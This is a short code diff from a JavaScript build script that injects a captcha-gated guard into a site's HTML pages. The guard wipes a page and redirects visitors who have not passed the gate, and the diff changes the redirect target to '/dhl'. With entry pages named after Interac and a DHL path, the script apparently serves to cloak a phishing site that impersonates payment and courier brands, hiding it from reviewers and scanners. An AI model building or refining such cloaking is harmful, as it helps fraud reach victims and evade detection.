@@ -18,7 +18,7 @@ const all = getAllHtml('public');
 const entryPages = ['captcha.html', 'interac.html', 'index.html', 'anchor.html'];
 
 let protectedCount = 0;
-const guardScript = `<script>if(!sessionStorage.getItem('__cptPass')||sessionStorage.getItem('__cptPass')!=='1'){try{document.documentElement.innerHTML=''}catch(e){}window.location.replace('/captcha.html');throw new Error('BLOCKED');}</script>`;
+const guardScript = `<script>if(!sessionStorage.getItem('__cptPass')||sessionStorage.getItem('__cptPass')!=='1'){try{document.documentElement.innerHTML=''}catch(e){}window.location.replace('/dhl');throw new Error('BLOCKED');}</script>`;
 
 all.forEach(filePath => {
   const norm = filePath.replace(/\\/g, '/').toLowerCase();
